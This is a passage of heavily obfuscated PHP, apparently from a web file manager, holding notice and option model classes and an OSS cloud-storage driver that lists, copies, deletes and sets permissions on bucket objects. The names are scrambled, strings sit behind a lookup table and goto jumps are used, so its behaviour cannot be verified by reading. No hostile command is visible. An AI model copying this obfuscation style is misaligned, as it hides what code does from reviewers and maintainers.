ßâœô[$_SERVER[º·Ï‹¥³][182]]) { return !1; } return parent::remove($æáÓŸéÅ); } public function sort($Õ÷Ïñ‡î, $Â‘»¤à) { return parent::update($Õ÷Ïñ‡î, $Â‘»¤à); } public function enable($‹Éë¡§Å, $Ó†øú‹ë) { return parent::update($‹Éë¡§Å, array($_SERVER[º·Ï‹¥³][2418] => $Ó†øú‹ë)); } private function initUserOption() { $É¿¸ï¶Ñ =& $_SERVER[º·Ï‹¥³]; $this->optionType = $É¿¸ï¶Ñ[2419]; $this->modelType = $É¿¸ï¶Ñ[2420]; $this->field = array($É¿¸ï¶Ñ[2421], $É¿¸ï¶Ñ[32], $É¿¸ï¶Ñ[197], $É¿¸ï¶Ñ[33], $É¿¸ï¶Ñ[2422], $É¿¸ï¶Ñ[802], $É¿¸ï¶Ñ[217]); } public function userNoticeGet($Ò¾ÄßÇæ = false) { $this->initUserOption(); return parent::listData($Ò¾ÄßÇæ, $_SERVER[º·Ï‹¥³][459], !0); } public function userNoticeAdd($ÏîŠ…ĞÉ) { $ñó°¼ãñ =& $_SERVER[º·Ï‹¥³]; $this->initUserOption(); $¬Çò®âÃ = $this->findByKey($ñó°¼ãñ[2421], $ÏîŠ…ĞÉ[$ñó°¼ãñ[459]]); if ($¬Çò®âÃ) { return !0; } $•ßò£Á’ = array($ñó°¼ãñ[2421] => $ÏîŠ…ĞÉ[$ñó°¼ãñ[459]], $ñó°¼ãñ[32] => $ÏîŠ…ĞÉ[$ñó°¼ãñ[32]], $ñó°¼ãñ[197] => $ÏîŠ…ĞÉ[$ñó°¼ãñ[197]], $ñó°¼ãñ[33] => isset($ÏîŠ…ĞÉ[$ñó°¼ãñ[33]]) ? $ÏîŠ…ĞÉ[$ñó°¼ãñ[33]] : 1, $ñó°¼ãñ[2422] => isset($ÏîŠ…ĞÉ[$ñó°¼ãñ[2422]]) ? $ÏîŠ…ĞÉ[$ñó°¼ãñ[2422]] : 0, $ñó°¼ãñ[802] => 0, $ñó°¼ãñ[217] => 0); return parent::insert($•ßò£Á’); } public function userNoticeEdit($Ú‘ö¶¥, $•˜±¾³Ä) { $this->initUserOption(); return parent::update($Ú‘ö¶¥, $•˜±¾³Ä); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\171\x73\x74\x65\x6d\x5f\157\160\x74\151\157\156"; protected $jsonField = array("\x6d\145\x6e\165", "\x72\157\154\x65", "\162\157\x6c\145\x47\162\157\x75\x70", "\162\x65\x67\x69\x73\x74", "\145\x6d\141\x69\154"); function __construct() { parent::__construct(); } protected function cacheKey($îüŠšá) { return "\123\x79\x73\164\x65\x6d\117\160\164\151\157\156\x5f{$îüŠšá}"; } protected function optionDefault($ÌÀƒ÷ëƒ = '') { $ø«ÇéÄ… =& $_SERVER[º·Ï‹¥³]; if ($ÌÀƒ÷ëƒ == $ø«ÇéÄ…[12]) { return $GLOBALS[$ø«ÇéÄ…[6]][$ø«ÇéÄ…[441]]; } } } class SystemRecordModel extends ModelBaseLight { } goto Eæ¡óÃòÕÅ; FÌ‰†ÏŞ“‹: class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public $config = array(); public function __construct($Û²Ş…Îá) { parent::__construct(); include_once SDK_DIR . $_SERVER[º·Ï‹¥³][1431]; $this->_init($Û²Ş…Îá); } public function _init($ê‡‰ ¾¿) { $×ÑÀ×õ =& $_SERVER[º·Ï‹¥³]; $this->config = $ê‡‰ ¾¿; foreach ($ê‡‰ ¾¿ as $±’ìÅ»æ => $‰³˜ƒÀ£) { if (isset($this->{$±’ìÅ»æ})) { $this->{$±’ìÅ»æ} = $‰³˜ƒÀ£; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($×ÑÀ×õ[1432] . LNG($×ÑÀ×õ[1433])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $½ò‚Ş =& $_SERVER[º·Ï‹¥³]; $İ£ª ˜ù = new OSS\Model\CorsConfig(); $µ…Ê³²Ë = new OSS\Model\CorsRule(); $µ…Ê³²Ë->addAllowedOrigin($½ò‚Ş[1434]); $µ…Ê³²Ë->addAllowedMethod($½ò‚Ş[1435]); $µ…Ê³²Ë->addAllowedMethod($½ò‚Ş[1436]); $µ…Ê³²Ë->addAllowedMethod($½ò‚Ş[1437]); $µ…Ê³²Ë->addAllowedMethod($½ò‚Ş[1438]); $µ…Ê³²Ë->addAllowedMethod($½ò‚Ş[164]); $µ…Ê³²Ë->setMaxAgeSeconds(600); $µ…Ê³²Ë->addExposeHeader($½ò‚Ş[1439]); $µ…Ê³²Ë->addAllowedHeader($½ò‚Ş[1434]); $İ£ª ˜ù->addRule($µ…Ê³²Ë); try { $this->client->putBucketCors($this->bucket, $İ£ª ˜ù); } catch (OSS\Core\OssException $ıôÈ€²Ë) { $this->writeLog(__FUNCTION__ . $½ò‚Ş[205] . $ıôÈ€²Ë->getMessage()); return !1; } return !0; } public function getBucketCors() { $Ó»£¦Öø =& $_SERVER[º·Ï‹¥³]; $“ÜÏÄ×ç = null; try { $“ÜÏÄ×ç = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $ÛÃ¤Ò´š) { $this->writeLog(__FUNCTION__ . $Ó»£¦Öø[205] . $ÛÃ¤Ò´š->getMessage()); return null; } if (!$“ÜÏÄ×ç || !($Šá¼ŠÆÒ = $“ÜÏÄ×ç->getRules())) { return null; } $©õÇ”¾ã = $Šá¼ŠÆÒ[0]->getAllowedOrigins(); $«Ú”¢Ó· = $Šá¼ŠÆÒ[0]->getAllowedMethods(); $Ï“Ö…« = $Šá¼ŠÆÒ[0]->getMaxAgeSeconds(); $…Ğß Ÿµ = $Šá¼ŠÆÒ[0]->getExposeHeaders(); $Ò³Ã¨İ™ = $Šá¼ŠÆÒ[0]->getAllowedHeaders(); return array($Ó»£¦Öø[209] => isset($©õÇ”¾ã[0]) ? $©õÇ”¾ã[0] : $Ó»£¦Öø[12], $Ó»£¦Öø[213] => $«Ú”¢Ó·, $Ó»£¦Öø[1440] => $Ï“Ö…«, $Ó»£¦Öø[1441] => isset($…Ğß Ÿµ[0]) ? $…Ğß Ÿµ[0] : $Ó»£¦Öø[12], $Ó»£¦Öø[210] => isset($Ò³Ã¨İ™[0]) ? $Ò³Ã¨İ™[0] : $Ó»£¦Öø[12]); } public function isBucketCors() { $ÀÁÙ¾”Í =& $_SERVER[º·Ï‹¥³]; $Ÿ¼ÙñùĞ = $this->getBucketCors(); if (!$Ÿ¼ÙñùĞ || !is_array($Ÿ¼ÙñùĞ)) { return !1; } if ($Ÿ¼ÙñùĞ[$ÀÁÙ¾”Í[209]] != $ÀÁÙ¾”Í[211] || $Ÿ¼ÙñùĞ[$ÀÁÙ¾”Í[210]] != $ÀÁÙ¾”Í[211]) { return !1; } $Ä‹Óù©ü = array_map($ÀÁÙ¾”Í[212], $Ÿ¼ÙñùĞ[$ÀÁÙ¾”Í[213]]); if (!is_array($Ä‹Óù©ü)) { $Ä‹Óù©ü = array(); } $Îñ˜´›å = array($ÀÁÙ¾”Í[214], $ÀÁÙ¾”Í[215], $ÀÁÙ¾”Í[216], $ÀÁÙ¾”Í[217], $ÀÁÙ¾”Í[218]); $ÜÅœØ§¦ = array_diff($Îñ˜´›å, $Ä‹Óù©ü); return empty($ÜÅœØ§¦); } public function mkfile($¨×üâ“Ú, $¶‘ÜÊ¡Ö = '', $°® Êµ = REPEAT_RENAME) { $¨¾ƒ¥åª = $this->setContent($¨×üâ“Ú, $¶‘ÜÊ¡Ö); if ($¨¾ƒ¥åª !== !1) { return $this->getPathOuter($¨×üâ“Ú); } return !1; } public function mkdir($×„ÕÚØ¥, $âå®à¡² = REPEAT_SKIP) { if ($âå®à¡² && $this->_isFolder($×„ÕÚØ¥)) { return $this->getPathOuter($×„ÕÚØ¥); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($×„ÕÚØ¥)); } catch (OSS\Core\OssException $éòµ‚ùê) { $this->writeLog(__FUNCTION__ . $_SERVER[º·Ï‹¥³][205] . $éòµ‚ùê->getMessage()); return !1; } return $this->getPathOuter($×„ÕÚØ¥); } private function fileList($œ–öÕ†á, $î³«ç = '', $¤×ó®¥Ã = 0) { $‡‹€¬ìµ =& $_SERVER[º·Ï‹¥³]; $œ–öÕ†á = trim($œ–öÕ†á, $‡‹€¬ìµ[8]); $ÉÃ¸åØ… = empty($œ–öÕ†á) && $œ–öÕ†á !== $‡‹€¬ìµ[219] ? $‡‹€¬ìµ[12] : $œ–öÕ†á . $‡‹€¬ìµ[8]; $Çàãˆ¬˜ = $‡‹€¬ìµ[12]; $ÖœÜõ¤µ = 1000; $ş¥¢§ü‚ = $£ãì‘×‡ = array(); while (!0) { check_abort(); $şğßÙâ  = array($‡‹€¬ìµ[1442] => $î³«ç, $‡‹€¬ìµ[1443] => $ÉÃ¸åØ…, $‡‹€¬ìµ[1444] => $ÖœÜõ¤µ, $‡‹€¬ìµ[1445] => $Çàãˆ¬˜); try { $ØÈàê–È = $this->client->listObjects($this->bucket, $şğßÙâ ); } catch (OSS\Core\OssException $Şœ…ñ½Š) { $this->writeLog(__FUNCTION__ . $‡‹€¬ìµ[205] . $Şœ…ñ½Š->getMessage()); break; } $Çàãˆ¬˜ = $ØÈàê–È->getNextMarker(); $Ì†¥Ò—Í = $ØÈàê–È->getObjectList(); $“–ËûÄ† = $ØÈàê–È->getPrefixList(); foreach ($Ì†¥Ò—Í as $›ÔÌü°ì) { if ($›ÔÌü°ì->getKey() == $ÉÃ¸åØ…) { continue; } $¡’–¶ı = $›ÔÌü°ì->getKey(); $’”¹òø‘ = $›ÔÌü°ì->getSize(); $¥“ÄãŠ· = $›ÔÌü°ì->getLastModified(); $…ŸŞ™‰ = trim($›ÔÌü°ì->getETag(), $‡‹€¬ìµ[121]); $Ë¾‚Æİæ = $¤×ó®¥Ã ? array($‡‹€¬ìµ[32] => $¡’–¶ı, $‡‹€¬ìµ[79] => $’”¹òø‘, $‡‹€¬ìµ[197] => strtotime($¥“ÄãŠ·), $‡‹€¬ìµ[1446] => $…ŸŞ™‰) : $¡’–¶ı; $õà‚§ÏÇ = $’”¹òø‘ == 0 && substr($¡’–¶ı, strlen($¡’–¶ı) - 1, 1) == $‡‹€¬ìµ[8] ? !0 : !1; $­ƒïŒ°˜ = array($‡‹€¬ìµ[79] => $’”¹òø‘, $‡‹€¬ìµ[1447] => $’”¹òø‘, $‡‹€¬ìµ[88] => strtotime($¥“ÄãŠ·), $‡‹€¬ìµ[1448] => $¥“ÄãŠ·, $‡‹€¬ìµ[1446] => $…ŸŞ™‰); $this->cacheMethodInfoSet($¡’–¶ı, $õà‚§ÏÇ, $­ƒïŒ°˜); if ($õà‚§ÏÇ) { $ş¥¢§ü‚[] = $¡’–¶ı; continue; } $£ãì‘×‡[] = $Ë¾‚Æİæ; } foreach ($“–ËûÄ† as $ÑÍ«â) { $ş¥¢§ü‚[] = $ÑÍ«â->getPrefix(); $this->cacheMethodInfoSet($ÑÍ«â->getPrefix(), !0); } if ($Çàãˆ¬˜ === $‡‹€¬ìµ[12]) { break; } } $this->cacheMethodInfoSet($œ–öÕ†á, !0); return array($‡‹€¬ìµ[85] => $ş¥¢§ü‚, $‡‹€¬ìµ[86] => $£ãì‘×‡); } public function listObject($¹Ÿ„¾Ûı, $Óå³½³Ú = '') { $ôêô¬ßõ =& $_SERVER[º·Ï‹¥³]; $¹Ÿ„¾Ûı = trim($¹Ÿ„¾Ûı, $ôêô¬ßõ[8]); $Œ‡ë‘ÌÁ = empty($¹Ÿ„¾Ûı) && $¹Ÿ„¾Ûı !== $ôêô¬ßõ[219] ? $ôêô¬ßõ[12] : $¹Ÿ„¾Ûı . $ôêô¬ßõ[8]; $ºğÛÀ´´ = $ôêô¬ßõ[12]; $ùß«ßâÀ = 1000; $¤êÛÂªÀ = $âûÀ’šì = array(); while (!0) { check_abort(); $Ç„Ûèºø = array($ôêô¬ßõ[1442] => $Óå³½³Ú, $ôêô¬ßõ[1443] => $Œ‡ë‘ÌÁ, $ôêô¬ßõ[1444] => $ùß«ßâÀ, $ôêô¬ßõ[1445] => $ºğÛÀ´´); try { $øàˆšÊ = $this->client->listObjects($this->bucket, $Ç„Ûèºø); } catch (OSS\Core\OssException $ìë×–ñ›) { $this->writeLog(__FUNCTION__ . $ôêô¬ßõ[205] . $ìë×–ñ›->getMessage()); break; } $ºğÛÀ´´ = $øàˆšÊ->getNextMarker(); $ŸÑÈÌÙÍ = $øàˆšÊ->getObjectList(); foreach ($ŸÑÈÌÙÍ as $ÚğÂ©æ) { if ($ÚğÂ©æ->getKey() == $Œ‡ë‘ÌÁ) { continue; } $ùçëæÄ = $ÚğÂ©æ->getKey(); $šË¡õ² = $ÚğÂ©æ->getSize(); $Ï™Ñß–‰ = $šË¡õ² == 0 && substr($ùçëæÄ, strlen($ùçëæÄ) - 1, 1) == $ôêô¬ßõ[8] ? !0 : !1; if ($Ï™Ñß–‰) { continue; } (yield $šË¡õ² . $ôêô¬ßõ[205] . $ùçëæÄ); } if ($ºğÛÀ´´ === $ôêô¬ßõ[12]) { break; } } } public function copyFile($€Éüêäó, $€Íßƒ”¥) { $ÆèºÏ— = $this->size($€Éüêäó); if ($ÆèºÏ— < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $€Éüêäó, $this->bucket, $this->pathEncode($€Íßƒ”¥)); } catch (OSS\Core\OssException $ÂŒë¨ÜÍ) { $this->writeLog(__FUNCTION__ . $_SERVER[º·Ï‹¥³][205] . $ÂŒë¨ÜÍ->getMessage()); return !1; } return $this->getPathOuter($€Íßƒ”¥); } $Ñ¢…àâš = $this->multiCopyObject($€Éüêäó, $€Íßƒ”¥, $ÆèºÏ—); return $Ñ¢…àâš ? $this->getPathOuter($€Íßƒ”¥) : !1; } private function multiCopyObject($„Ï€‹, $Ş—±÷Á, $‰Š½ø†¤) { $“Òë÷îà =& $_SERVER[º·Ï‹¥³]; try { $ª“ïª‰Å = array(); if ($çİİ´‘ = $this->hashMd5($„Ï€‹)) { $ª“ïª‰Å = array(OSS\OssClient::OSS_HEADERS => array($“Òë÷îà[1449] => $çİİ´‘)); } $½Íè‡Ç— = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($Ş—±÷Á), $ª“ïª‰Å); $Ó§÷Ê™“ = 1; $úàäÀš„ = 0; $ëÓÑ²²Û = array(); $¸Äõò‘ = 1024 * 1024 * 10; $‰ŸÅà‘¨ = $this->client->generateMultiuploadParts($‰Š½ø†¤, $¸Äõò‘); foreach ($‰ŸÅà‘¨ as $Ô—Ø½é => $¶”ß…å) { $¿‚áíØÑ = $úàäÀš„ + (int) $¶”ß…å[$“Òë÷îà[1450]]; $—ï•´Õü = (int) $¶”ß…å[$“Òë÷îà[388]] + $¿‚áíØÑ - 1; $ÓØÒÕ½’ = array($“Òë÷îà[1451] => $¿‚áíØÑ, $“Òë÷îà[1452] => $—ï•´Õü); $ëÓÑ²²Û[] = $this->client->uploadPartCopy($this->bucket, $„Ï€‹, $this->bucket, $this->pathEncode($Ş—±÷Á), $Ó§÷Ê™“, $½Íè‡Ç—, $ÓØÒÕ½’); $Ó§÷Ê™“ = $Ó§÷Ê™“ + 1; } $–è¾İĞú = array(); foreach ($ëÓÑ²²Û as $Ô—Ø½é => $´ÑÆœÆ£) { $–è¾İĞú[] = array($“Òë÷îà[1453] => $Ô—Ø½é + 1, $“Òë÷îà[1454] => $´ÑÆœÆ£); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($Ş—±÷Á), $½Íè‡Ç—, $–è¾İĞú); } catch (OSS\Core\OssException $ £ÉµŸÁ) { $this->writeLog(__FUNCTION__ . $“Òë÷îà[205] . $ £ÉµŸÁ->getMessage()); return !1; } return !0; } public function moveFile($¤íœşÈ±, $ÁëÀÃé“) { if ($this->copyFile($¤íœşÈ±, $ÁëÀÃé“)) { $this->remove($¤íœşÈ±); return $this->getPathOuter($ÁëÀÃé“); } return !1; } public function delFile($÷ÔË”ßü) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($÷ÔË”ßü)); } catch (OSS\Core\OssException $ÆƒÁª•ä) { $this->writeLog(__FUNCTION__ . $_SERVER[º·Ï‹¥³][205] . $ÆƒÁª•ä->getMessage()); return !1; } return !0; } public function delFolder($‡˜ñİ¬í) { $ôó¨ÂØİ =& $_SERVER[º·Ï‹¥³]; if (!$this->exist($‡˜ñİ¬í)) { return !0; } $this->listItemCache = !1; $îÎ˜šÜ = $this->fileList($‡˜ñİ¬í); $this->listItemCache = !0; $¦Ùôï·ª = trim($‡˜ñİ¬í, $ôó¨ÂØİ[8]) . $ôó¨ÂØİ[8]; if (!empty($‡˜ñİ¬í) && $‡˜ñİ¬í !== $ôó¨ÂØİ[219] && !in_array($¦Ùôï·ª, $îÎ˜šÜ[$ôó¨ÂØİ[85]])) { $îÎ˜šÜ[$ôó¨ÂØİ[85]][] = $¦Ùôï·ª; } $¸«à‚¶ì = $this->delByBatch($îÎ˜šÜ[$ôó¨ÂØİ[86]]); if (!$¸«à‚¶ì) { return !1; } $¸«à‚¶ì = $this->delByBatch($îÎ˜šÜ[$ôó¨ÂØİ[85]]); if (!$¸«à‚¶ì) { return !1; } return $this->delFile($¦Ùôï·ª); } private function delByBatch($àÖŞ×—¥) { foreach (array_chunk($àÖŞ×—¥, 1000) as $ö¢æà˜) { try { $this->client->deleteObjects($this->bucket, $ö¢æà˜); } catch (OSS\Core\OssException $ô†±œßÓ) { $this->writeLog(__FUNCTION__ . $_SERVER[º·Ï‹¥³][205] . $ô†±œßÓ->getMessage()); return !1; } } return !0; } public function rename($Ñíæ×‚Ë, $¤Ç“–Ç†) { return $this->renameObject($Ñíæ×‚Ë, $¤Ç“–Ç†); } private function fileInfo($²°íÓ‰², $Ä¥Æµû = false, $™ôãÇ¥Á = array()) { $Ü¼åŠ =& $_SERVER[º·Ï‹¥³]; $ïóÜ¨¶ = array($Ü¼åŠ[32] => $this->pathThis($²°íÓ‰²), $Ü¼åŠ[87] => $this->getPathOuter($²°íÓ‰²), $Ü¼åŠ[33] => $Ü¼åŠ[221], $Ü¼åŠ[79] => isset($™ôãÇ¥Á[$Ü¼åŠ[79]]) ? $™ôãÇ¥Á[$Ü¼åŠ[79]] : 0, $Ü¼åŠ[178] => $this->ext($²°íÓ‰²)); if ($Ä¥Æµû) { return $ïóÜ¨¶; } $ïóÜ¨¶[$Ü¼åŠ[222]] = $ïóÜ¨¶[$Ü¼åŠ[88]] = 0; $ïóÜ¨¶[$Ü¼åŠ[223]] = $ïóÜ¨¶[$Ü¼åŠ[224]] = !0; if (empty($™ôãÇ¥Á)) { $Ïûä–ÅÈ = $this->objectMeta($²°íÓ‰²); if (!$Ïûä–ÅÈ) { return $ïóÜ¨¶; } $™ôãÇ¥Á = array($Ü¼åŠ[88] => strtotime($Ïûä–ÅÈ[$Ü¼åŠ[1448]]), $Ü¼åŠ[79] => $Ïûä–ÅÈ[$Ü¼åŠ[1447]] + 0, $Ü¼åŠ[1446] => $Ïûä–ÅÈ[$Ü¼åŠ[1446]]); } if (isset($™ôãÇ¥Á[$Ü¼åŠ[1446]]) && $™ôãÇ¥Á[$Ü¼åŠ[1446]]) { $ïóÜ¨¶[$Ü¼åŠ[226]] = trim($™ôãÇ¥Á[$Ü¼åŠ[1446]], $Ü¼åŠ[121]); } if (isset($™ôãÇ¥Á[$Ü¼åŠ[79]])) { $ïóÜ¨¶[$Ü¼åŠ[79]] = $™ôãÇ¥Á[$Ü¼åŠ[79]]; } if (isset($™ôãÇ¥Á[$Ü¼åŠ[88]])) { $ïóÜ¨¶[$Ü¼åŠ[88]] = $™ôãÇ¥Á[$Ü¼åŠ[88]]; } if (isset($™ôãÇ¥Á[$Ü¼åŠ[197]]) && !trim($ïóÜ¨¶[$Ü¼åŠ[88]])) { $ïóÜ¨¶[$Ü¼åŠ[88]] = $™ôãÇ¥Á[$Ü¼åŠ[197]]; } return $ïóÜ¨¶; } private function folderInfo($ıÓ»…Í, $·ÓÆŸ• = false, $š›Â†×“ = array()) { $×µ¡®×Ê =& $_SERVER[º·Ï‹¥³]; $óÜ§¬”Œ = array($×µ¡®×Ê[32] => $this->pathThis($ıÓ»…Í), $×µ¡®×Ê[87] => $this->getPathOuter($×µ¡®×Ê[8] . $ıÓ»…Í), $×µ¡®×Ê[33] => $×µ¡®×Ê[78]); if ($·ÓÆŸ•) { return $óÜ§¬”Œ; } $óÜ§¬”Œ[$×µ¡®×Ê[222]] = $óÜ§¬”Œ[$×µ¡®×Ê[88]] = 0; $óÜ§¬”Œ[$×µ¡®×Ê[223]] = $óÜ§¬”Œ[$×µ¡®×Ê[224]] = !0; if (empty($š›Â†×“)) { $ıÓ»…Í = rtrim($ıÓ»…Í, $×µ¡®×Ê[8]) . $×µ¡®×Ê[8]; $ÕÛ˜Óª© = $this->objectMeta($ıÓ»…Í); if (!$ÕÛ˜Óª©) { return $óÜ§¬”Œ; } $š›Â†×“ = array($×µ¡®×Ê[222] => $ÕÛ˜Óª©[$×µ¡®×Ê[560]][$×µ¡®×Ê[1455]], $×µ¡®×Ê[88] => strtotime($ÕÛ˜Óª©[$×µ¡®×Ê[1448]])); } if (isset($š›Â†×“[$×µ¡®×Ê[88]])) { $óÜ§¬”Œ[$×µ¡®×Ê[88]] = $š›Â†×“[$×µ¡®×Ê[88]]; } if (isset($š›Â†×“[$×µ¡®×Ê[222]])) { $óÜ§¬”Œ[$×µ¡®×Ê[222]] = $š›Â†×“[$×µ¡®×Ê[222]]; } return $óÜ§¬”Œ; } public function listPath($ä¯–¸µ, $îÙñö¥ = false) { $¢«µòÎ¿ =& $_SERVER[º·Ï‹¥³]; $Ç…Ï˜× = $this->fileList($ä¯–¸µ, $¢«µòÎ¿[8], !0); foreach ($Ç…Ï˜×[$¢«µòÎ¿[85]] as $ Ò¯ãÑÄ => $ÇÖı½ ) { $Ç…Ï˜×[$¢«µòÎ¿[85]][$ Ò¯ãÑÄ] = $this->folderInfo($ÇÖı½ , $îÙñö¥, $ÇÖı½ ); } foreach ($Ç…Ï˜×[$¢«µòÎ¿[86]] as $ Ò¯ãÑÄ => $ÇÖı½ ) { $Ç…Ï˜×[$¢«µòÎ¿[86]][$ Ò¯ãÑÄ] = $this->fileInfo($ÇÖı½ [$¢«µòÎ¿[32]], $îÙñö¥, $ÇÖı½ ); } return $Ç…Ï˜×; } protected function infoChildren($«‹íé›¥, &$ñÂÜ’„·) { $˜‰¬ÍêÔ =& $_SERVER[º·Ï‹¥³]; $ÚµÚôü¡ = $this->fileList($«‹íé›¥, $˜‰¬ÍêÔ[12], !0); $ñÂÜ’„·[$˜‰¬ÍêÔ[81]] += count($ÚµÚôü¡[$˜‰¬ÍêÔ[85]]); $ñÂÜ’„·[$˜‰¬ÍêÔ[80]] += count($ÚµÚôü¡[$˜‰¬ÍêÔ[86]]); foreach ($ÚµÚôü¡[$˜‰¬ÍêÔ[86]] as $³æ¤ãğÑ) { if (!$³æ¤ãğÑ || !$³æ¤ãğÑ[$˜‰¬ÍêÔ[79]]) { continue; } $ñÂÜ’„·[$˜‰¬ÍêÔ[79]] += $³æ¤ãğÑ[$˜‰¬ÍêÔ[79]]; } } public function has($Úú¬¾±æ, $’ŒÀ„äÚ = false, $´Ä§¬”Ú = true) { $´ÈïØåæ =& $_SERVER[º·Ï‹¥³]; $Úú¬¾±æ = trim($Úú¬¾±æ, $´ÈïØåæ[8]); $Ë‰©ä¶è = empty($Úú¬¾±æ) && $Úú¬¾±æ !== $´ÈïØåæ[219] ? $´ÈïØåæ[12] : $Úú¬¾±æ . $´ÈïØåæ[8]; $¿äÏßÛ— = $´ÈïØåæ[12]; $îÑŸ„ÎÉ = 500; $á«¥ÓáË = $ŒæèÒ¡ù = 0; while (!0) { check_abort(); $À£œÀ«Ú = array($´ÈïØåæ[1442] => $´ÈïØåæ[8], $´ÈïØåæ[1443] => $Ë‰©ä¶è, $´ÈïØåæ[1444] => $îÑŸ„ÎÉ, $´ÈïØåæ[1445] => $¿äÏßÛ—); try { $¼ëÔÃ‡ = $this->client->listObjects($this->bucket, $À£œÀ«Ú); } catch (OSS\Core\OssException $ÄœÈæ¶ä) { $this->writeLog(__FUNCTION__ . $´ÈïØåæ[205] . $ÄœÈæ¶ä->getMessage()); break; } $¿äÏßÛ— = $¼ëÔÃ‡->getNextMarker(); $àÇöúôù = $¼ëÔÃ‡->getObjectList(); $ ¨ûÜ•Â = $¼ëÔÃ‡->getPrefixList(); if ($’ŒÀ„äÚ) { if (count($àÇöúôù) > 1 || count($àÇöúôù) == 1 && $àÇöúôù[0]->getKey() != $Ë‰©ä¶è) { $á«¥ÓáË += count($àÇöúôù) - 1; } if (!empty($ ¨ûÜ•Â)) { $ŒæèÒ¡ù += count($ ¨ûÜ•Â); } if ($¿äÏßÛ— === $´ÈïØåæ[12]) { break; } continue; } if ($´Ä§¬”Ú) { if (!empty($àÇöúôù)) { if (count($àÇöúôù) > 1 || $àÇöúôù[0]->getKey() != $Ë‰©ä¶è) { return !0; } } } else { if (!empty($ ¨ûÜ•Â)) { return !0; } } if ($¿äÏßÛ— === $´ÈïØåæ[12]) { break; } } if ($’ŒÀ„äÚ) { return array($´ÈïØåæ[230] => $á«¥ÓáË, $´ÈïØåæ[231] => $ŒæèÒ¡ù); } return !1; } public function listAll($÷³Éş»Š) { $ÂÌ´ =& $_SERVER[º·Ï‹¥³]; $Š±×„ÍÍ = $this->fileList($÷³Éş»Š, $ÂÌ´[12], !0); $ïÑ‘„ôŠ = array_to_keyvalue($Š±×„ÍÍ[$ÂÌ´[86]], $ÂÌ´[32]); foreach ($Š±×„ÍÍ[$ÂÌ´[85]] as $”³âø£¬) { if (is_string($”³âø£¬)) { $ïÑ‘„ôŠ[$”³âø£¬] = array($ÂÌ´[79] => 0); } } return $this->listAllFiles($÷³Éş»Š, $ïÑ‘„ôŠ); } public function canRead($­µ€ ®û) { $áˆÚîù» =& $_SERVER[º·Ï‹¥³]; $Äœ‡‘‡ = $this->pathAcl($­µ€ ®û); return $Äœ‡‘‡ == $áˆÚîù»[1456] || $Äœ‡‘‡ == $áˆÚîù»[603] ? !0 : !1; } public function canWrite($‰‘©ë¦—) { $ØÂğßŞÖ = $this->pathAcl($‰‘©ë¦—); return $ØÂğßŞÖ == $_SERVER[º·Ï‹¥³][603] ? !0 : !1; } public function pathAcl($Ìã„è˜É) { $Í‡Èûß… =& $_SERVER[º·Ï‹¥³]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $¬ì÷º€Û = $this->client->getObjectAcl($this->bucket, $this->pathEncode($Ìã„è˜É)); } catch (OSS\Core\OssException $»Üä˜ğ›) { $this->writeLog(__FUNCTION__ . $Í‡Èûß…[205] . $»Üä˜ğ›->getMessage()); return !1; } $üÉá’Ì = $¬ì÷º€Û == $Í‡Èûß…[37] ? $this->bucketAcl : $¬ì÷º€Û; if ($üÉá’Ì == $Í‡Èûß…[1457]) { return $Í‡Èûß…[1456]; } if ($üÉá’Ì == $Í‡Èûß…[1458]) { return $Í‡Èûß…[603]; } return $üÉá’Ì; } private function chmodPath($òçèŞ , $ÇÂŠ¶‹½ = '') { $¦èÙ˜¨Ô =& $_SERVER[º·Ï‹¥³]; $â»‡÷±Ò = empty($ÇÂŠ¶‹½) ? $¦èÙ˜¨Ô[1458] : $ÇÂŠ¶‹½; $‰è»á Ï = array($¦èÙ˜¨Ô[37], $¦èÙ˜¨Ô[220], $¦èÙ˜¨Ô[1457], $¦èÙ˜¨Ô[1458]); if (!in_array($â»‡÷±Ò, $‰è»á Ï)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($òçèŞ ), $â»‡÷±Ò); } catch (OSS\Core\OssException $áè¬âÆ) { $this->writeLog(__FUNCTION__ . $¦èÙ˜¨Ô[205] . $áè¬âÆ->getMessage()); return !1; } return !0; } public function getContent($´Óàè‘–) { return $this->fileSubstr($´Óàè‘–, -1); } public function setContent($ØúİÑÅÃ, $µœ¡åƒ§ = '') { $±ø‚ÅÆ¨ =& $_SERVER[º·Ï‹¥³]; try { $ıÃ¨¯ÑÑ = $this->trafficLimit($±ø‚ÅÆ¨[1459]); $ôûò·é– = $this->client->putObject($this->bucket, $this->pathEncode($ØúİÑÅÃ), $µœ¡åƒ§, $ıÃ¨¯ÑÑ); } catch (OSS\Core\OssException $ø¶€ğ”Ã) { $this->writeLog(__FUNCTION__ . $±ø‚ÅÆ¨[205] . $ø¶€ğ”Ã->getMessage()); return !1; } $ëŒ¸–Ú = array($±ø‚ÅÆ¨[1449] => trim($ôûò·é–[$±ø‚ÅÆ¨[1446]], $±ø‚ÅÆ¨[121]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($ØúİÑÅÃ))); $this->updateObjMeta($ØúİÑÅÃ, $ëŒ¸–Ú); return isset($ôûò·é–[$±ø‚ÅÆ¨[1460]][$±ø‚ÅÆ¨[283]]) ? !0 : !1; } private function updateObjMeta($´ÚòşÍ, $…â™İŞÚ) { $´ÚòşÍ = $this->pathEncode($´ÚòşÍ); try { $ËµïİŸ“ = array(OSS\OssClient::OSS_HEADERS => $…â™İŞÚ); $this->client->copyObject($this->bucket, $´ÚòşÍ, $this->bucket, $´ÚòşÍ, $ËµïİŸ“); } catch (OSS\Core\OssException $›ÜõÜµŸ) { $this->writeLog(__FUNCTION__ . $_SERVER[º·Ï‹¥³][205] . $›ÜõÜµŸ->getMessage()); 